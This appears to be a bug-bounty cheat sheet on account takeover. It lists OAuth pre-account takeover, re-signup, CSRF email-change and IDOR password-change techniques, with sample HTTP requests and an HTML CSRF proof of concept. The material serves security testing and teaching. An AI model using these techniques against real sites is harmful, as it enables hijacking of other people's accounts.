# Account Takeover (ATO)

## How to exploit

1. OAuth misconfiguration
   - Victim has an account on evil.com.
   - Attacker registers on evil.com via OAuth (e.g. Facebook) using the victim's email.
   - Attacker changes the OAuth-linked email to the victim's email.
   - Victim tries to sign up normally on evil.com — gets "email already exists" and is now locked into the attacker-controlled account.

2. Re-signup race
   - Sign up with the victim's email:

   ```
   POST /newaccount HTTP/1.1
   ...
   email=victim@mail.com&password=1234
   ```

   - Sign up again with the same email, different password:

   ```
   POST /newaccount HTTP/1.1
   ...
   email=victim@mail.com&password=hacked
   ```

3. Via CSRF
   - Register as attacker, fill in the profile, check the change-email request in Account Detail.
   - Capture the change-email request, build a CSRF PoC from it.
   - Example PoC — email value replaced with the victim's:

   ```html
   <html>
   <body>
      <form action="https://evil.com/user/change-email" method="POST">
         <input type="hidden" value="victim@gmail.com"/>
         <input type="submit" value="Submit Request">
      </form>
   </body>
   </html>
   ```

4. Chaining with IDOR, for example

   ```
   POST /changepassword.php HTTP/1.1
   Host: site.com
   ...
   userid=500&password=heked123
   ```

   500 is an attacker ID and 501 is a victim ID, so we change the userid from attacker to victim ID

5. No Rate Limit on 2FA

References:

- [Pre-Account Takeover using OAuth Misconfiguration](https://vijetareigns.medium.com/pre-account-takeover-using-oauth-misconfiguration-ebd32b80f3d3)
- [Account Takeover via CSRF](https://medium.com/bugbountywriteup/account-takeover-via-csrf-78add8c99526)
- [How re-signing up for an account lead to account takeover](https://zseano.medium.com/how-re-signing-up-for-an-account-lead-to-account-takeover-3a63a628fd9f)
